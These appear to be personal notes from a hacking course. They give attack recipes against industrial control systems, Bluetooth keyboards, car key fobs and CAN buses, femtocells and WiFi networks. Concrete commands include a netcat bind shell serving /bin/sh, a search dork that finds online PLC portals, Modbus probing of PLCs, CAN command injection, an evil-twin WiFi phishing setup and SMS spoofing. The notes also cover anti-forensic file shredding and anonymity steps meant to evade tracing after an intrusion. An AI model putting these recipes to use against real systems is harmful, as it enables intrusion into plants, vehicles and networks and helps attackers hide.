Scada ICS hack
ICS - Industrial Control System run by
PLCS - Programmable Logic Controllers
(prisons, factories other facilities)
 
Rubber Duckey: 
A flashdrive which has a reprogrammed firmware 
telling the system that it is not a storage device, but a keyboard.
With that you can send keystrokes to the system already stored on the device.
Antivirus can detect it if it is as known exploit.

Nethunter: Kali on phone
Airodump-ng: packet capture tool
suitable to capture WEP IVs or WPA handshakesto use them in aircrack-ng
Inside the handshake there is the hash od the password


BLUETOOTH hacking
** sudo hciconfig - shows the available bluetooth interfaces 
if you have a bluetooth adapter
** sudo hcitool scan - scan for bluetooth devices in the area
** sudo hcitool inq - gives the device class (0X002540 - keyboard)
** sudo apt install spooftooph
spooftoph can spoof the mac address of a bluetooth device
** sudo spooftooph -i hci0 -a new mac address -n new name
the device still needs to be paired with the pc and act as a keyboard
If that is successful you can inject commands 
into the host system through the bluetooth device

Google search: inurl:/Portal/Portal.mwsl
finds PLCS system portals (most plants are online)

mimikatz can read the memory out of windows systems
where also passwords can be available


Spoof my text - spoofing sms messages
texbelt.com
the sender number cannot be chosen
you cannot send URLs


RaspberryPi hacking
Download Kali ARM version for your Pi
Create an image on an SD card adn insert it into the Raspberry
netcat -> creates a tcp connection 
** sudo nc -l -p59 -e /bin/sh -> listener on the Pi
** sudo nc ip address 59 -> on the attacker
we have a connection now

** nmap -sT default gateway
** msfconsole -> metasploit
search modbus

** gem install modbus-cli
we can probe the memory in the PLCS


Car Hacks
Software Defined Radio
(drones, car keys, wifi, mobile phones are all sending radio signals)
we need to pickup and send signals back
(RTL-SDR USB-kit - HDSDR.de - receiver only)
1. you can jam the signal so the fob will not close the car
2. you can capture and store the signal and replay it

post 2020 cars have a rolling code already, harder to hack
The antenna is important

HackRF device can receive and send signals too 
(not simultaneously - either receive or send)
dragon OS - specificly designed for SRD
useful apps: 
- airspy
- universal radio hacker
- gqrx

osmocom_siggen_nogui - can generate blocking signals even wifi
OBD II connector under the dashboard to read out info from the car
can-utils -> working with car networks
github.com/zombieacraig/ICSim - car simulator
cansniffer - sniffing the can network: what command does what in the car system
candump - grab the sniffed traffic and dump in a file
can send command#data - sends the command to the car
there is no standard command set in the industry 


Mobile hacking
femtocell hardware (network extender)
used for men in the middle attacks
USBtoHDMI cable is needed
inside the femtocell a small linux kernel is running (monta linux)
it doesn't have a bash shell
get root access
flash it with a new linux kernel/firmware (openwrt)
works within 15 - 50 ft
voice and sms are encrypted



WiFi Hacking with Raspberry PI 4
Get Kali ARM
Get Raspberry Pi OS (raspberry Pi Imager)
Write the Kali system to the SD card
micro HDMI converter
default Kali login: kali / pwd kali

fern - monitor wifi traffic
for attacking you need a wordlist (included in kali)

wifite - cli wifi attacking app


Hacking android phones or iPads
need OMG cable with built in
- access point
- keylogger
- load script

Check reverse shell
A rubber duckey runs a script which creates a reverse shell 
on the target pc when the thumb drive is connected.


Hiding secret files in music and photo files
Steganography: putting data into a channel of another file

deepsound - jpinsoft.net
Least significant bit cryptography 
(changes the least significant bits in the visible file. 
When converting back the secret file 
those minor changes will be compiled back to the secret file)
The original file becomes significantly larger

Do not use Word for storing secret text, because your GUID is embedded.
(Global Unique Identification Number - info about your PC)
Use Vim, Open Office, Notepad, anythung but office apps

deepsound uses AES256 encryption

stegosuite (kali) can use image
stegosuite -k key - m "message" "/path to the file to embed in"
stegosuite extract -k key /path to the embedded file

we can embed a complete file too

How to get rid of the information completely after getting it
deletion is not an option - always recoverable
shred (linux) - overwrites the file repeatedly
shred -f -n 10 "filename with path" (force and number of iteration)

bleachbit (has GUI)
overwrites the files similarly to shred
can cleanup the system too


How to be anonymous
- Don't use Chrome, Edge even Mozzilla isn't safe
- Brave is better
- Disable cookies
- use private browser windows
- use proxychains (kali)
	sudo mousepad /etc/proxychains4.conf
	by default uses TOR
	sudo systemctl start tor
	sudo proxychains firefox
- sudo git clone https://github.com/Und3rf10w/kali-anonsurf
	sudo ./installer
	sudo anonsurf start
- create false profiles
- use starlink (no geolocation to the IP address)
- use protonmail
- learn antiforensics and osint 
- don't use google for search
- use duckduckgo in brave instead


WiFi phishing
WPA2 hacking is a guessing game, 
needs a wordlist in the language of the target wifi
social engineering is important - create a password list from that

wifiphisher - creates an evil twin (man in the middle)
needs a wifi adapter with monitor mode
sudo wifiphisher -i wlan0 -e access point name we want to attack
projects a firmware update screen on the target 
and captures the password entered

burpsuite - create munged password list
